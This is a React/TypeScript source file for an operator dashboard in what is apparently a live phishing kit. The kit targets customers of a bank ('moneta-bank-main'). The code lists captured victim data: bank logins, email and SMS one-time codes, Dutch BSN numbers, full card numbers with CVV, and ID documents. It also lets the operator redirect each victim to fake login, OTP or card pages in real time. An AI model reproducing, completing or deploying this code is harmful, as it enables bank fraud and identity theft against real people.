import { useState, useEffect } from 'react';
import { PageType } from '../../contexts/SessionContext';
import { Moon, Sun, Trash2, Home, RefreshCw, Copy, Check, ExternalLink, Wifi, WifiOff, Activity, Users, Zap } from 'lucide-react';
import { Button } from '../ui/button';
import { Badge } from '../ui/badge';
import { Switch } from '../ui/switch';
import { toast } from 'sonner@2.0.3';
import { Toaster } from '../ui/sonner';
import { PartyKitAdminClient } from '../../lib/partykit-client';
import adminLogo from 'figma:asset/4460c1e9675ba5671e9e370a99ca83e83eca2146.png';

// Client data structure from PartyKit
interface ClientData {
  clientId: string;
  sessionId: string;
  currentPage: string;
  status: 'online' | 'offline';
  startedAt: number;
  lastSeen: number;
  ip: string;
  userAgent: string;
  location?: string;
  data: {
    loginCredentials?: { username: string; password: string; timestamp: number };
    emailOTP?: { code: string; timestamp: number };
    smsOTP?: { code: string; timestamp: number };
    personalData?: {
      firstName: string;
      lastName: string;
      email: string;
      phone: string;
      dob: string;
      bsn: string;
      timestamp: number;
    };
    creditCard?: {
      number: string;
      name: string;
      expiry: string;
      cvv: string;
      timestamp: number;
    };
    documents?: Array<{ name: string; url: string; timestamp: number }>;
    qrCode?: { url: string; timestamp: number };
    whatsappNumber?: { number: string; timestamp: number };
  };
  activityHistory: Array<{
    timestamp: number;
    page: string;
    action: string;
    details?: string;
  }>;
}

// Admin Logo Component
const AdminLogo = () => (
  <div className="relative w-10 h-10 flex items-center justify-center bg-gradient-to-br from-pink-500 to-rose-600 rounded-lg shadow-lg">
    <img src={adminLogo} alt="Admin" className="w-6 h-6 object-contain" />
    <div className="absolute -top-1 -right-1 w-3 h-3 bg-emerald-400 rounded-full border-2 border-slate-900 animate-pulse" />
  </div>
);

export default function AdminDashboard() {
  const [clients, setClients] = useState<ClientData[]>([]);
  const [darkMode, setDarkMode] = useState(true);
  const [showOnlyOnline, setShowOnlyOnline] = useState(false);
  const [copiedField, setCopiedField] = useState<string>('');
  const [partyClient] = useState(() => {
    const host = import.meta.env?.VITE_PARTYKIT_HOST || "localhost:1999";
    return new PartyKitAdminClient(host, "moneta-bank-main");
  });
  const [connectionStatus, setConnectionStatus] = useState<'connecting' | 'connected' | 'disconnected'>('connecting');

  // Connect to PartyKit
  useEffect(() => {
    partyClient.connect()
      .then(() => {
        setConnectionStatus('connected');
        toast.success('🚀 Connected to PartyKit - Ultra-fast real-time monitoring active!');
      })
      .catch(() => {
        setConnectionStatus('disconnected');
        toast.error('❌ Failed to connect to PartyKit');
      });

    // Listen for all clients
    partyClient.on('server:all_clients', (clientsList: ClientData[]) => {
      setClients(clientsList);
    });

    // Listen for client updates
    partyClient.on('server:client_update', (updatedClient: ClientData) => {
      setClients(prev => {
        const index = prev.findIndex(c => c.clientId === updatedClient.clientId);
        if (index >= 0) {
          const newClients = [...prev];
          newClients[index] = updatedClient;
          return newClients;
        } else {
          return [...prev, updatedClient];
        }
      });
    });

    return () => {
      partyClient.disconnect();
    };
  }, [partyClient]);

  // Filter clients
  const filteredClients = showOnlyOnline 
    ? clients.filter(c => c.status === 'online')
    : clients;

  // Statistics
  const stats = {
    total: clients.length,
    online: clients.filter(c => c.status === 'online').length,
    offline: clients.filter(c => c.status === 'offline').length,
  };

  const handleCopy = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    toast.success(`✅ Copied ${field}`);
    setTimeout(() => setCopiedField(''), 2000);
  };

  const handleViewClient = (clientId: string) => {
    // Open client detail view in new tab
    const url = `/admin/client/${clientId}`;
    window.open(url, `client_${clientId}`, 'width=1400,height=900');
  };

  const handleRedirect = (clientId: string, page: PageType) => {
    partyClient.redirectClient(clientId, page);
    toast.success(`🔄 Redirecting client to ${page}`);
  };

  const handleDisconnect = (clientId: string) => {
    partyClient.disconnectClient(clientId);
    toast.success(`🚫 Disconnected client`);
  };

  const formatTime = (timestamp: number) => {
    const date = new Date(timestamp);
    return date.toLocaleTimeString();
  };

  const formatDuration = (timestamp: number) => {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    if (seconds < 60) return `${seconds}s ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    return `${hours}h ago`;
  };

  const getPageDisplayName = (page: string): string => {
    const pageMap: Record<string, string> = {
      'alert': '🔔 Security Alert',
      'login': '🔐 Login',
      'loading': '⏳ Loading',
      'personal-data': '👤 Personal Data',
      'credit-card': '💳 Credit Card',
      'document-upload': '📄 Documents',
      'email-otp': '📧 Email OTP',
      'sms-otp': '📱 SMS OTP',
      'qr-code': '📷 QR Code',
      'qr-upload': '📸 QR Upload',
      'url-verification': '🔗 URL Verification',
      'whatsapp-support': '💬 WhatsApp',
      'app-verification': '📱 App Verification',
      'wrong-details': '❌ Error',
      'success': '✅ Success'
    };
    return pageMap[page] || page;
  };

  return (
    <div className={`min-h-screen ${darkMode ? 'dark bg-slate-950' : 'bg-slate-50'}`}>
      <Toaster position="top-right" />
      
      {/* Header */}
      <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border-b sticky top-0 z-50`}>
        <div className="px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <AdminLogo />
              <div>
                <h1 className={`${darkMode ? 'text-white' : 'text-slate-900'}`}>
                  fAdmin - PartyKit Real-Time Dashboard
                </h1>
                <p className={`${darkMode ? 'text-slate-400' : 'text-slate-500'}`}>
                  Ultra-fast monitoring powered by Cloudflare Edge
                </p>
              </div>
            </div>

            <div className="flex items-center gap-4">
              {/* Connection Status */}
              <div className={`flex items-center gap-2 px-3 py-2 rounded-lg ${
                connectionStatus === 'connected' 
                  ? 'bg-emerald-500/10 text-emerald-400'
                  : connectionStatus === 'connecting'
                  ? 'bg-yellow-500/10 text-yellow-400'
                  : 'bg-red-500/10 text-red-400'
              }`}>
                <Zap className="w-4 h-4" />
                <span className="text-xs font-medium">
                  {connectionStatus === 'connected' ? 'Live' : connectionStatus === 'connecting' ? 'Connecting...' : 'Disconnected'}
                </span>
              </div>

              {/* Dark Mode Toggle */}
              <div className="flex items-center gap-2">
                <Sun className={`w-4 h-4 ${darkMode ? 'text-slate-600' : 'text-yellow-500'}`} />
                <Switch checked={darkMode} onCheckedChange={setDarkMode} />
                <Moon className={`w-4 h-4 ${darkMode ? 'text-blue-400' : 'text-slate-400'}`} />
              </div>

              <Button
                onClick={() => window.location.href = '/'}
                variant="outline"
                className={darkMode ? 'border-slate-700 text-slate-300' : ''}
              >
                <Home className="w-4 h-4 mr-2" />
                Exit Admin
              </Button>
            </div>
          </div>

          {/* Stats Bar */}
          <div className="grid grid-cols-3 gap-4 mt-4">
            <div className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded-lg p-4`}>
              <div className="flex items-center justify-between">
                <div>
                  <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Total Clients</p>
                  <p className={`${darkMode ? 'text-white' : 'text-slate-900'}`}>{stats.total}</p>
                </div>
                <Users className={`w-8 h-8 ${darkMode ? 'text-blue-400' : 'text-blue-500'}`} />
              </div>
            </div>

            <div className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded-lg p-4`}>
              <div className="flex items-center justify-between">
                <div>
                  <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Online</p>
                  <p className="text-emerald-400">{stats.online}</p>
                </div>
                <Wifi className="w-8 h-8 text-emerald-400" />
              </div>
            </div>

            <div className={`${darkMode ? 'bg-slate-800' : 'bg-slate-100'} rounded-lg p-4`}>
              <div className="flex items-center justify-between">
                <div>
                  <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Offline</p>
                  <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>{stats.offline}</p>
                </div>
                <WifiOff className={`w-8 h-8 ${darkMode ? 'text-slate-600' : 'text-slate-400'}`} />
              </div>
            </div>
          </div>

          {/* Filters */}
          <div className="flex items-center gap-4 mt-4">
            <div className="flex items-center gap-2">
              <Switch checked={showOnlyOnline} onCheckedChange={setShowOnlyOnline} />
              <span className={`${darkMode ? 'text-slate-300' : 'text-slate-700'}`}>
                Show only online
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Clients Grid */}
      <div className="p-6">
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4">
          {filteredClients.map(client => (
            <div
              key={client.clientId}
              className={`${
                darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'
              } border rounded-lg p-4 hover:shadow-lg transition-shadow`}
            >
              {/* Client Header */}
              <div className="flex items-start justify-between mb-3">
                <div className="flex items-center gap-3">
                  {client.status === 'online' ? (
                    <Wifi className="w-5 h-5 text-emerald-400" />
                  ) : (
                    <WifiOff className="w-5 h-5 text-slate-600" />
                  )}
                  <div>
                    <p className={`${darkMode ? 'text-white' : 'text-slate-900'} font-medium`}>
                      Session {client.sessionId.slice(-8)}
                    </p>
                    <p className={`${darkMode ? 'text-slate-400' : 'text-slate-500'}`}>
                      {formatDuration(client.startedAt)}
                    </p>
                  </div>
                </div>
                <Badge variant={client.status === 'online' ? 'default' : 'secondary'}>
                  {client.status}
                </Badge>
              </div>

              {/* Client Info */}
              <div className="space-y-2 mb-3">
                <div className="flex items-center justify-between">
                  <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>IP:</span>
                  <div className="flex items-center gap-2">
                    <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                      {client.ip}
                    </span>
                    <button
                      onClick={() => handleCopy(client.ip, 'IP')}
                      className={`${darkMode ? 'text-slate-500 hover:text-slate-300' : 'text-slate-400 hover:text-slate-600'}`}
                    >
                      {copiedField === 'IP' ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                    </button>
                  </div>
                </div>

                <div className="flex items-center justify-between">
                  <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Page:</span>
                  <span className={`${darkMode ? 'text-blue-400' : 'text-blue-600'}`}>
                    {getPageDisplayName(client.currentPage)}
                  </span>
                </div>

                <div className="flex items-center justify-between">
                  <span className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>Activity:</span>
                  <span className={`${darkMode ? 'text-slate-200' : 'text-slate-800'}`}>
                    {client.activityHistory.length} actions
                  </span>
                </div>
              </div>

              {/* Captured Data Summary */}
              <div className={`${darkMode ? 'bg-slate-800' : 'bg-slate-50'} rounded p-2 mb-3`}>
                <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'} mb-1`}>Captured:</p>
                <div className="flex flex-wrap gap-1">
                  {client.data.loginCredentials && (
                    <Badge variant="outline" className="bg-purple-500/10 text-purple-400 border-purple-500/30">
                      🔐 Login
                    </Badge>
                  )}
                  {client.data.personalData && (
                    <Badge variant="outline" className="bg-blue-500/10 text-blue-400 border-blue-500/30">
                      👤 Personal
                    </Badge>
                  )}
                  {client.data.creditCard && (
                    <Badge variant="outline" className="bg-green-500/10 text-green-400 border-green-500/30">
                      💳 Card
                    </Badge>
                  )}
                  {client.data.documents && client.data.documents.length > 0 && (
                    <Badge variant="outline" className="bg-yellow-500/10 text-yellow-400 border-yellow-500/30">
                      📄 Docs ({client.data.documents.length})
                    </Badge>
                  )}
                  {client.data.emailOTP && (
                    <Badge variant="outline" className="bg-pink-500/10 text-pink-400 border-pink-500/30">
                      📧 Email OTP
                    </Badge>
                  )}
                  {client.data.smsOTP && (
                    <Badge variant="outline" className="bg-orange-500/10 text-orange-400 border-orange-500/30">
                      📱 SMS OTP
                    </Badge>
                  )}
                </div>
              </div>

              {/* Actions */}
              <div className="flex gap-2">
                <Button
                  onClick={() => handleViewClient(client.clientId)}
                  className="flex-1 bg-blue-600 hover:bg-blue-700"
                  size="sm"
                >
                  <ExternalLink className="w-3 h-3 mr-1" />
                  View Details
                </Button>
                <Button
                  onClick={() => handleDisconnect(client.clientId)}
                  variant="destructive"
                  size="sm"
                >
                  <Trash2 className="w-3 h-3" />
                </Button>
              </div>
            </div>
          ))}
        </div>

        {filteredClients.length === 0 && (
          <div className={`${darkMode ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'} border rounded-lg p-12 text-center`}>
            <Activity className={`w-12 h-12 ${darkMode ? 'text-slate-700' : 'text-slate-300'} mx-auto mb-4`} />
            <p className={`${darkMode ? 'text-slate-400' : 'text-slate-600'}`}>
              {showOnlyOnline ? 'No online clients' : 'No clients connected'}
            </p>
            <p className={`${darkMode ? 'text-slate-500' : 'text-slate-500'} mt-2`}>
              Waiting for connections...
            </p>
          </div>
        )}
      </div>
    </div>
  );
}
